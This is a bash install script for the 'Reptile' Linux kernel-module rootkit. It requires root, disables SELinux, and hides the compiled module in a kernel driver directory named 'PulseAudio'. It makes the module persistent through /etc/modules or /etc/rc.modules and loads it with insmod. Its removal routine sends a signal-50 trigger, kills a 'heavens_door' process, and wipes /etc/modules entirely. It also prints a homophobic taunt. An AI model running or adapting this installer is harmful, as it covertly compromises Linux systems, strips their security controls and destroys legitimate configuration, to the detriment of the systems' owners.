#!/bin/bash
#
# Reptile Install Script
# Author: F0rb1dd3n

MODULE="reptile"
DRIVER="PulseAudio"
KERNEL_VERSION=$(uname -r)
DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"

function banner {
	echo -e "\n\e[00;31m############################################################################\e[00m"
	echo -e "\e[00;31m############################ \e[01;36mREPTILE INSTALLER\e[00;31m #############################\e[00m"
	echo -e "\e[00;31m############################################################################\e[00m"
	echo -e "\e[00;36mwritten by: F0rb1dd3n\e[00m"
}

function usage {
	banner
	echo -e "\nUsage: $0 <arg>\n"
	echo -e "\tbuild\t\tCompile the module"
	echo -e "\tinstall\t\tCompile and install the module persistently"
	echo -e "\tremove\t\tRemove the persistence of module\n"
}

function directory_remove {
	read -p "Would you like to remove this directory ($PWD) on exit? (Y/N) [default: N]: "
	if [ "$REPLY" == "Y" ] || [ "$REPLY" == "y" ]; then
        	echo -n "Removing $PWD... "
        	rm -rf $PWD && echo -e "\e[01;36mDONE!\e[00m" || echo -e "\e[01;31mERROR!\e[00m"
	elif [ "$REPLY" == "N" ] || [ "$REPLY" == "n" ] || [ -z $REPLY ]; then
        	echo -e "Not removing $PWD"
	else
        	echo -e "Invalid option. Not removing $PWD"
	fi
}



function reptile_init {
	banner

	[ $(uname) != "Linux" ] && {
		echo "Not on a Linux system. Exiting..."
		exit
	}

	[ $(id -u) != 0 ] && {
		echo "Not root. Exiting..."
		exit
	}

	if [ -f /etc/selinux/config ]; then
        	echo -ne "SELinux config found on system!\nChecking SELinux status... "
        	if [[ $(cat /etc/selinux/config | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]]; then
                	echo -ne "\e[01;31menforcing\e[00m\n"
                	echo -n "Trying to set enforce permissive... "
                	setenforce 0
                	if [ "$(getenforce)" == "Permissive" ]; then
                        	echo -e "\e[01;36mDONE!\e[00m"
                	else
                        	echo -e "\e[01;31mERROR!\e[00m"
                	fi
                	echo -n "Trying to disable SELinux... "
                	sed -i "s:SELINUX=enforcing:SELINUX=disabled:" /etc/selinux/config || {
                        	echo -e "\e[01;31mERROR!\e[00m\n"
                        	echo -e "\e[01;33mIf your system reboot the selinux will enable and PAM will fail.\e[00m\n"
                        	echo -e "\e[01;33mI recommend you abort this installation or restore pam_unix.so.\e[00m\n"
                        	#exit
                	}
                	echo -e "\e[01;36mDONE!\e[00m"
                	echo -e "\e[01;33mMaybe you will need to reboot!\e[00m"
        	else
                	echo -e "\e[01;36mclear\e[00m"
        	fi
	fi      

	[ ! -e /proc ] && {
        	echo -e "\nWe're in a horrible jail as /proc doesn't exist. Exiting..."
        	exit
	}

	if [ ! -d $DRIVER_DIRECTORY ]; then
        	mkdir -p $DRIVER_DIRECTORY
    	fi

    	for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null)
       	do 
            	SYSTEM=${f:5:${#f}-13}
    	done

    	if [ "$SYSTEM" == "" ]; then
        	#TODO: error message
        	exit
    	fi
}

function reptile_build {
	echo -e "\n\e[00;31m############################### \e[01;36mBuilding...\e[00;31m ################################\e[00m\n"
	make all

	echo -e "\n\e[00;31m############################### \e[01;36mCleanning...\e[00;31m ###############################\e[00m\n" 
	make clean

	mv bin/rep_mod bin/$MODULE.ko
}

function reptile_install {
	reptile_init

	echo -ne "\nCompiling... "
	make all > /dev/null 2>&1 && \
	make clean > /dev/null 2>&1 && \
	mv bin/rep_mod bin/$MODULE.ko > /dev/null 2>&1 && \
	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

	echo -n "Copying binaries to /$MODULE... "
	mkdir -p /$MODULE && \
	cp bin/$MODULE* /$MODULE && \
	cp scripts/start.sh /$MODULE/$MODULE"_start.sh" && \
	rm -rf bin && \
	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
    	echo -ne "Installing... "
    
	cp "/$MODULE/$MODULE.ko" "$DRIVER_DIRECTORY" 2> /dev/null || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
    
    	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
        	echo -e "#<reptile>\nreptile\n#</reptile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
    	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
        	echo -e "#<reptile>\nreptile\n#</reptile>" >> /etc/rc.modules && \
		chmod +x /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	#elif [ "$SYSTEM" == "arch" ]; then
        #	echo -e "#<reptile>\nreptile\n#</reptile> >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
    	fi
    	
	depmod && insmod /$MODULE/$MODULE.ko && \
	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

	directory_remove
	echo -e "\nInstalation has finished!\n"
}

function reptile_remove {
	banner
	
	if [ ! -d "/$MODULE" ]; then
	       echo -e "\nReptile seems to be uninstalled!\n"	
	       exit
	fi

	echo -e "\n\e[01;31mYou are gay!\e[00m"
	echo -ne "Uninstalling... "

	if [ -z $(lsmod | grep rep_mod | cut -d " " -f 1) ]; then
		kill -50 '0' && rmmod rep_mod || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	else	
		rmmod rep_mod || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	fi

	kill -9 `ps -ef | grep heavens_door | grep -v grep | awk '{print $2}'` && \
	rm -rf /$MODULE && \
	rm -rf $DRIVER_DIRECTORY && \
	rm -rf /etc/rc.modules && \
	echo '' > /etc/modules && \
	depmod && echo -e "\e[01;36mDONE!\e[00m\n" || echo -e "\e[01;31mERROR!\e[00m\n"
	
	directory_remove
	echo
}

case $1 in
	build)
		reptile_build
		echo -e "\n\e[01;36mDONE!\e[00m\n"
		;;
    	install)
        	reptile_install
        	;;
    	remove)
        	reptile_remove
        	;;
	"")
		usage
		;;
esac
